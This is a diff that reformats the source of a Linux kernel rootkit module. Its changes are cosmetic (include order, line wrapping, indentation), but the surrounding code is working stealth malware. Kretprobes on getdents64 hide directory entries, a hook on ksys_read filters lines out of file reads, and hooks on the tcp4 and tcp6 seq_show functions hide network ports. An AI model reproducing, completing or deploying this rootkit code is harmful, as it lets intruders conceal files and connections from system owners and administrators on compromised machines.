@@ -1,12 +1,12 @@
 // SPDX-License-Identifier: GPL-2.0
-#include <linux/types.h>
+#include "rootkit.h"
 #include <linux/dirent.h>
 #include <linux/kprobes.h>
 #include <linux/seq_file.h>
 #include <linux/slab.h>
+#include <linux/types.h>
 #include <linux/uaccess.h>
 #include <net/inet_sock.h>
-#include "rootkit.h"
 
 #ifndef SEQ_START_TOKEN
 #define SEQ_START_TOKEN ((void *)1)
@@ -27,8 +27,7 @@ static bool should_hide_dirent(const char *name)
 	return false;
 }
 
-static int getdents_entry(struct kretprobe_instance *ri,
-			   struct pt_regs *regs)
+static int getdents_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
 	struct getdents_data *data;
 
@@ -38,8 +37,7 @@ static int getdents_entry(struct kretprobe_instance *ri,
 	return 0;
 }
 
-static int getdents_return(struct kretprobe_instance *ri,
-			    struct pt_regs *regs)
+static int getdents_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
 	struct getdents_data *data;
 	struct linux_dirent64 *d;
@@ -68,8 +66,7 @@ static int getdents_return(struct kretprobe_instance *ri,
 			long remaining = new_total - off - d->d_reclen;
 
 			if (remaining > 0)
-				memmove(kbuf + off,
-					kbuf + off + d->d_reclen,
+				memmove(kbuf + off, kbuf + off + d->d_reclen,
 					remaining);
 			new_total -= d->d_reclen;
 		} else {
@@ -88,11 +85,11 @@ static int getdents_return(struct kretprobe_instance *ri,
 }
 
 struct kretprobe rk_getdents_probe = {
-	.handler        = getdents_return,
-	.entry_handler  = getdents_entry,
-	.data_size      = sizeof(struct getdents_data),
-	.maxactive      = 20,
-	.kp.symbol_name = "__x64_sys_getdents64",
+    .handler = getdents_return,
+    .entry_handler = getdents_entry,
+    .data_size = sizeof(struct getdents_data),
+    .maxactive = 20,
+    .kp.symbol_name = "__x64_sys_getdents64",
 };
 
 /* Read filter (content lines) */
@@ -170,11 +167,11 @@ static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 }
 
 struct kretprobe rk_read_probe = {
-	.handler        = read_return,
-	.entry_handler  = read_entry,
-	.data_size      = sizeof(struct read_data),
-	.maxactive      = 20,
-	.kp.symbol_name = "ksys_read",
+    .handler = read_return,
+    .entry_handler = read_entry,
+    .data_size = sizeof(struct read_data),
+    .maxactive = 20,
+    .kp.symbol_name = "ksys_read",
 };
 
 /* TCP seq_show filter (ports) */
@@ -184,8 +181,7 @@ struct tcp_show_data {
 	struct sock *sk;
 };
 
-static int tcp_show_entry(struct kretprobe_instance *ri,
-			   struct pt_regs *regs)
+static int tcp_show_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
 	struct tcp_show_data *data;
 
@@ -196,8 +192,7 @@ static int tcp_show_entry(struct kretprobe_instance *ri,
 	return 0;
 }
 
-static int tcp_show_return(struct kretprobe_instance *ri,
-			    struct pt_regs *regs)
+static int tcp_show_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
 	struct tcp_show_data *data;
 	struct inet_sock *inet;
@@ -220,17 +215,17 @@ static int tcp_show_return(struct kretprobe_instance *ri,
 }
 
 struct kretprobe rk_tcp4_probe = {
-	.handler        = tcp_show_return,
-	.entry_handler  = tcp_show_entry,
-	.data_size      = sizeof(struct tcp_show_data),
-	.maxactive      = 20,
-	.kp.symbol_name = "tcp4_seq_show",
+    .handler = tcp_show_return,
+    .entry_handler = tcp_show_entry,
+    .data_size = sizeof(struct tcp_show_data),
+    .maxactive = 20,
+    .kp.symbol_name = "tcp4_seq_show",
 };
 
 struct kretprobe rk_tcp6_probe = {
-	.handler        = tcp_show_return,
-	.entry_handler  = tcp_show_entry,
-	.data_size      = sizeof(struct tcp_show_data),
-	.maxactive      = 20,
-	.kp.symbol_name = "tcp6_seq_show",
+    .handler = tcp_show_return,
+    .entry_handler = tcp_show_entry,
+    .data_size = sizeof(struct tcp_show_data),
+    .maxactive = 20,
+    .kp.symbol_name = "tcp6_seq_show",
 };
